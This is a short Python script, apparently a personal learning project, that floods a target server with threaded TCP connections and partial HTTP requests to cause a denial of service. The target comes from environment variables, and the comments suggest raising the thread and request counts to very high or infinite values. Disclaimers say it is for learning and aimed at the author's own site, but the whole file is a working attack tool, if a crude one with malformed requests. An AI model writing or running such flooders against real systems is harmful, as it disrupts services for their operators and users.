## Script used to DoS servers
## Purely for learning, DO NOT USE MALICIOUSLY

# Python does not provide actual multi-threading, it is just simulated
# so it is probably not the best choice for a DoS but whatever
import threading
import socket
import time
from dotenv import load_dotenv
import os

load_dotenv()

# Target IP or Domain Name
# Do NOT DoS someone, it is highly illegal
# I am DoSing my own website
TARGET = os.getenv("TARGET")
url = os.getenv("URL")

# Get IP by domain name
TARGET = socket.gethostbyname(url)

# TARGET = "127.0.0.1"

# This is fake IP that can be used in the header, Note: Just because we are adding a fake ip in the header does not mean we cannot be tracked
SENDER_IP = "192.168.57.134"

# Adjust Port based on which service we want to DoS
# 22 for ssh or 80 for HTTP etc
# 443 for HTTPS
# I am just DoSing local host
PORT = 443
# PORT = 8080

# Can be set to a really high or infinite loop
NUM_THREADS = 5
REQUESTS_PER_THREAD = 5

num_conns = 0

def dos():
    for _ in range(REQUESTS_PER_THREAD):
        # Define and connect socket
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((TARGET, PORT))
            sock.sendto(("GET /" + TARGET + " HTTP/1.1\r\n").encode('ascii'), (TARGET, PORT))
            # Spoof header, some website require header to be a certain format
            # I am using url in the header instead of the fake ip, because this is the expected header format
            sock.sendto(("Host: " + url).encode('ascii'), (TARGET, PORT))

            # Depending on if server sends response
            # response = sock.recv(1024)
            # print("[RESPONSE]", response.decode().strip())
            sock.close()
        except Exception as e:
            print("[ERROR]", e)

threads = []

start_time = time.time()

for _ in range(NUM_THREADS):
    thread = threading.Thread(target=dos)
    thread.start()
    threads.append(thread)

for t in threads:
    t.join()

print(f"[DONE] Sent {NUM_THREADS * REQUESTS_PER_THREAD} requests in {time.time() - start_time:.2f} seconds.")